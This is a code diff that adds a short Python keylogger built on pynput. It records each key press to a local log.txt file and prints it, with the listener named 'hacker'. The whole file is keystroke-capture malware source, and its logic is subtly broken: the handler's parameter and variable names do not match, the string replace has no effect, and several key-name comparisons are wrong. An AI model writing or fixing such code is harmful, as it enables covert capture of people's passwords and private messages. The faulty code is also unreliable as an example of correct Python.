@@ -1,0 +1,23 @@
+from pynput.keyboard import Listener
+
+def anonymous(key):
+    Key = str(Key)
+    Key.replace(" ' " ," ")
+
+    if Key == "key.f12":
+        raise SystemExit(0)
+    if Key == " Key.ctrl_l ":
+        Key = ""
+    if Key == "Key.enter":
+        Key = "\n"
+    if Key == "Key.alt_l":
+        Key = "\n"
+    if Key == "Key.tab":
+        Key = "\n"
+    
+    with open("log.txt","a") as file:
+        file.write(Key)
+    print(Key)
+
+with Listener(on_press=anonymous) as hacker:
+    hacker.join()
